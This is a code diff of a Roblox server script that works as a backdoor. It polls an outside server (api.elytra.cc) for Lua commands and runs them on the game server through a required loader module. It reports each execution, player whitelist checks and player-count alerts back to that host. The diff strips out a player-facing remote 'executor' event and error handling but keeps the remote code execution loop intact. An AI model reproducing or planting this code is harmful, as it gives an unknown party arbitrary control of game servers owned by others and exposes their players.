@@ -1,95 +1,46 @@
 local url = "https://api.elytra.cc/"
 local http = game:GetService("HttpService")
 
-local thing = require(18696356924)
-local localsc : LocalScript = thing.thing
-
-local load
 local hasHitFive = false
 
 local function sendMessage(text)
 	local data = http:JSONEncode({ message = text })
 
-	local success, err = pcall(function()
+	pcall(function()
 		http:PostAsync(url.."send", data, Enum.HttpContentType.ApplicationJson)
-	end)
-	if not success then
-		warn("Failed to send message: ", err)
-	end
+	end)  
 end
 
-local function checkPlayerWhitelist(plr:Player)
-	local success, response = pcall(function()
-		return http:GetAsync(url.."check/?username="..plr.Name)
-	end)
-	if success then
-		if tostring(response) == "true" then
-			sendMessage(string.format("<:person:1262458386889441375> | %s has been given the GUI", plr.Name))
-			local clone = localsc:Clone()
-			clone.Parent = plr.PlayerGui
-			clone.Enabled = true
-		end
-	else
-		warn("Failed to check whitelist: ", response)
+local function checkPlayerWhitelist(plr)
+	local response = http:GetAsync(url.."check/?username="..plr.Name)
+	if tostring(response) == "true" then
+		sendMessage(string.format("<:person:1262458386889441375> | %s has been given the GUI", plr.Name))
 	end
 end
 
 local function checkForCommands(jobId)
-	local success, err = pcall(function()
-		load = require(14381312180)
-	end)
-	if not success then
-		warn("Failed to load command module: ", err)
-		return
-	end
-
+	local load = require(14381312180)
 	while true do
 		wait(5)
-		local success, response = pcall(function()
-			return http:GetAsync(url.."heartbeat/?jobid="..jobId)
-		end)
-		if success then
-			local commands = pcall(function()
-				return http:JSONDecode(response)
-			end)
+		local response = http:GetAsync(url.."heartbeat/?jobid="..jobId)
+		local commands = http:JSONDecode(response)
 
-			if commands and #commands > 0 then
-				for _, command in ipairs(commands) do
-					local success, err = pcall(function()
-						load(command)()
-					end)
-					if success then
-						sendMessage(string.format("<:rack:1262457591422779423> | A segment of code was just executed on the server! Code: ```lua\n%s```", command))
-					else
-						warn("Failed to execute command: ", err)
-					end
-				end
+		if commands and #commands > 0 then
+			for _, command in ipairs(commands) do
+				pcall(function()
+					load(command)()
+				end)
+				sendMessage(string.format("<:rack:1262457591422779423> | A segment of coded was just executed on the server! Code: ```lua\n%s```", command))
 			end
-			if not hasHitFive then
-				if #game.Players:GetPlayers() >= 5 then
-					hasHitFive = true
-					sendMessage(string.format("<:rack:1262457591422779423> | JobId `%s` ([%s](%s)) has hit 5 players! There may be a flight occurring! @everyone", jobId, game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "https://roblox.com/games/"..game.PlaceId))
-				end
+		end
+		if not hasHitFive then
+			if #game.Players:GetPlayers() >= 5 then
+				hasHitFive = true
+				sendMessage(string.format("<:rack:1262457591422779423> | JobId `%s` ([%s](%s)) has hit 5 players! There may be a flight occuring! @everyone", jobId,game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, "https://roblox.com/games/"..game.PlaceId))
 			end
-		else
-			warn("Failed to get heartbeat: ", response)
 		end
 	end
 end
-
-local re = Instance.new("RemoteEvent")
-re.Name = "PROP_RE"
-re.Parent = game:GetService("ReplicatedStorage")
-
-re.OnServerEvent:Connect(function(plr, msg)
-	local success, err = pcall(function()
-		load(msg)()
-		sendMessage(string.format("<:rack:1262457591422779423> | `%s` just executed code using the executor! Code: ```lua\n%s```", plr.Name, msg))
-	end)
-	if not success then
-		warn("Failed to execute remote event code: ", err)
-	end
-end)
 
 local chatToken = http:GenerateGUID(false)
 local jobId = game.JobId ~= "" and game.JobId or http:GenerateGUID(false)
